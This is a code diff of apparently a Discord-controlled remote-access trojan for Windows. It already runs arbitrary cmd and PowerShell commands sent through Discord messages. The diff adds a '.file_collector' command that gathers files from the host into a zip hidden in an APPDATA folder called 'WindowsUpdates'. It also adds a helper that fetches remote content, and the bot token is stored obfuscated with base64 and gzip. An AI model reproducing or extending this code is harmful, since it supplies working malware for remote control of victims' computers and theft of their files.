@@ -9,17 +9,15 @@ import base64
 import gzip
 import subprocess
 import json
-
-#TODO
-# - Add more commands
-# - Fix boot persistence
-
+import requests
+import time
 
 modules_path = os.getcwd() + "\modules"
 client = discord.Client(intents=discord.Intents.all())
+file_version = "2.0"
 
 #load config
-with open(f"config.json", "r") as f:
+with open(f"cfg/config.json", "r") as f:
         config = json.load(f)
 
 def load_modules():
@@ -39,6 +37,10 @@ def list_modules():
         if module.endswith(".py") or module.endswith(".pyw"):
             modules += module + "\n"
     return modules
+
+def get_raw_git_content(url):
+    r = requests.get(url)
+    return r.text
 
 @client.event
 async def on_ready():
@@ -105,6 +107,7 @@ async def on_message(message):
         embed2.add_field(name=".monitor", value="Turns the monitor on/off. Usage: ``.monitor <on/off>``", inline=False)
         embed2.add_field(name=".cmd", value="Runs a command on the host computer. Usage: ``.cmd <command>``", inline=False)
         embed2.add_field(name=".pws", value="Runs a powershell command on the host computer. Usage: ``.pws <command>``", inline=False)
+        embed2.add_field(name=".file_collector", value="Collects some files from the host computer. Usage: ``.file_collector``", inline=False)
         try:
             await message.channel.send(embed=embed)
             await message.channel.send(embed=embed2)
@@ -486,5 +489,18 @@ async def on_message(message):
     if message.content.startswith(".pws"):
         arg = message.content.replace(".pws ","")
         subprocess.call("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe " + arg, shell=True)
+
+    if message.content.startswith(".file_collector"):
+        await message.delete()
+        #run file_collector.pyw and wait until finished then send collected_files.zip
+        os.system(f"py {os.getcwd()}\\built_in_modules\\file_collector.pyw")
+
+        embed = discord.Embed(title="File Collector", description="File collector executed.", color=0x00ff00)
+        
+        while(os.path.exists(f"{os.getenv('APPDATA')}\\WindowsUpdates\\collected_files.zip") == False):
+            time.sleep(1)
+
+        await message.channel.send(embed=embed)
+        
 
 client.run(gzip.decompress(base64.b64decode(reg_h.get_token())).decode("utf-8"))
